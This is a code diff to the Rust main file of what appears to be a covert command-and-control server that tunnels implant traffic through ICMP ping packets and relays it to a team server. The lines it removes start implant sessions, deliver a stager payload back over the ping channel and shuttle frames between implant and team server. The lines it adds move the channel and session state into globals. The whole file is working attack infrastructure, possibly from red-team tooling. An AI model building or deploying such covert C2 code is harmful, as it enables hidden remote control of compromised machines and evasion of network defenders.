@@ -1,21 +1,23 @@
 #![feature(slice_range)]
 #![feature(never_type)]
 mod nft;
-mod worker;
 mod web;
+mod worker;
 use anyhow::{bail, Result};
 
 use crate::nft::NftRules;
 use clap::Parser;
-use covert_c2_ping_common::{Arch, PingMessage};
+use covert_c2_ping_common::PingMessage;
 use covert_common::CovertChannel;
-use covert_server::{CSFrameRead, CSFrameWrite};
 use lazy_static::lazy_static;
-use std::{collections::HashMap, sync::Arc, time::Duration};
+use std::{collections::HashMap, time::Duration};
 use tokio::{
     select,
     signal::{self, unix::SignalKind},
-    sync::{mpsc, Mutex},
+    sync::{
+        mpsc::{self, UnboundedSender},
+        Mutex,
+    },
     task,
 };
 use tracing::{Instrument, Level};
@@ -47,6 +49,10 @@ lazy_static! {
         }
         return key_vec.try_into().expect("Could not make array");
     };
+    static ref CHANNEL: Mutex<CovertChannel<PingMessage, 4>> =
+        Mutex::new(CovertChannel::<PingMessage, 4>::new(*KEY));
+    static ref SESSIONS: Mutex<HashMap<u16, UnboundedSender<()>>> =
+        Mutex::new(HashMap::<u16, UnboundedSender<()>>::new());
 }
 
 fn main() {
@@ -90,8 +96,6 @@ async fn entry() -> Result<()> {
 
     let main_h = task::spawn(main_loop(downstream_sender, upstream_receiver));
 
-
-
     select! {
         // _ = web_h => {}
         _ = recv_h => {}
@@ -110,12 +114,6 @@ async fn main_loop(
     downstream_sender: mpsc::UnboundedSender<PingTransaction>,
     mut upstream_reciever: mpsc::UnboundedReceiver<PingTransaction>,
 ) -> Result<()> {
-    let channel = Arc::new(Mutex::new(
-        covert_common::CovertChannel::<PingMessage, 4>::new(*KEY),
-    ));
-    let sessions = Arc::new(Mutex::new(
-        HashMap::<u16, mpsc::UnboundedSender<PingMessage>>::new(),
-    ));
     loop {
         tracing::info!("Waiting for message");
         let incoming_ping = match upstream_reciever.recv().await {
@@ -125,29 +123,29 @@ async fn main_loop(
                 break;
             }
         };
-        let channel_state = channel.lock().await.put_packet(&incoming_ping.data);
+        let channel_state = CHANNEL.lock().await.put_packet(&incoming_ping.data);
         let out_data: Vec<u8> = match channel_state {
             Ok((inc_chan, has_message)) => {
                 if has_message {
-                    let res = channel.lock().await.get_message(inc_chan);
-                    match res {
-                        Some(in_message) => {
-                            handle_message(in_message, inc_chan, sessions.clone(), channel.clone())
-                                .await;
+                    let mut session_guard = SESSIONS.lock().await;
+                    let session = session_guard.get(&inc_chan);
+                    if let Some(notify) = session {
+                        if let Err(_) = notify.send(()) {
+                            tracing::info!(channel = inc_chan, "channel closed");
+                            session_guard.remove(&inc_chan);
                         }
-                        None => {
-                            tracing::info!("No message in channel");
-                        }
-                    };
+                    } else {
+                        tracing::info!(channel = inc_chan, "not a valid channel");
+                    }
                 }
-                let (in_num, out_num) = channel.lock().await.packets_in_queue(inc_chan);
+                let (in_num, out_num) = CHANNEL.lock().await.packets_in_queue(inc_chan);
                 tracing::info!(
                     inbound_packets = in_num,
                     outbound_packets = out_num,
                     channel = inc_chan,
                     "channel status"
                 );
-                channel.lock().await.get_packet(inc_chan)
+                CHANNEL.lock().await.get_packet(inc_chan)
             }
             Err(e) => {
                 match e {
@@ -161,7 +159,6 @@ async fn main_loop(
                         tracing::info!("Failed to deserialize packets to message")
                     }
                 }
-
                 continue;
             }
         };
@@ -181,92 +178,4 @@ async fn main_loop(
         };
     }
     Ok(())
-}
-
-pub async fn handle_message(
-    message: PingMessage,
-    stream: u16,
-    sessions: Arc<Mutex<HashMap<u16, mpsc::UnboundedSender<PingMessage>>>>,
-    channel: Arc<Mutex<CovertChannel<PingMessage, 4>>>,
-) {
-    if let PingMessage::InitMessage(arch, pipename) = message {
-        let (sender, mut receiver) = mpsc::unbounded_channel::<PingMessage>();
-
-        task::spawn(async move {
-            let arch = match arch {
-                Arch::i686 => "x86",
-                Arch::X86_64 => "x64",
-            };
-            let connection = match covert_server::start_implant_session(
-                &GLOBAL_CONF.ts,
-                arch,
-                &pipename,
-            )
-            .await
-            {
-                Ok((payload, connection)) => {
-                    channel
-                        .lock()
-                        .await
-                        .put_message(PingMessage::DataMessage(payload), stream);
-                    connection
-                }
-                Err(_) => {
-                    tracing::info!("Failed to connect to team server");
-                    channel
-                        .lock()
-                        .await
-                        .put_message(PingMessage::CloseMessage, stream);
-                    return;
-                }
-            };
-            sessions.lock().await.insert(stream, sender);
-            let (mut read_tcp, mut write_tcp) = connection.into_split();
-            let ts_reader = task::spawn(async move {
-                loop {
-                    match read_tcp.read_frame().await {
-                        Ok(data) => channel
-                            .lock()
-                            .await
-                            .put_message(PingMessage::DataMessage(data), stream),
-                        Err(_) => {
-                            tracing::info!("Session closed with TS");
-                            break;
-                        }
-                    };
-                }
-            });
-            let ts_writer = task::spawn(async move {
-                loop {
-                    match receiver.recv().await {
-                        Some(PingMessage::DataMessage(data)) => {
-                            if let Err(_) = write_tcp.write_frame(&data).await {
-                                tracing::info!("Session closed with TS");
-                                break;
-                            };
-                        }
-                        Some(_) => {
-                            tracing::info!("Invalid message received")
-                        }
-                        None => {
-                            tracing::info!("Session closed with downstream");
-                            break;
-                        }
-                    };
-                }
-            });
-            select! {
-                _ = ts_reader => {}
-                _ = ts_writer => {}
-            };
-            sessions.lock().await.remove(&stream);
-        });
-    } else {
-        let mut sessions_guard = sessions.lock().await;
-        if let Some(sender) = sessions_guard.get(&stream) {
-            if let Err(_) = sender.send(message) {
-                sessions_guard.remove(&stream);
-            };
-        }
-    }
 }
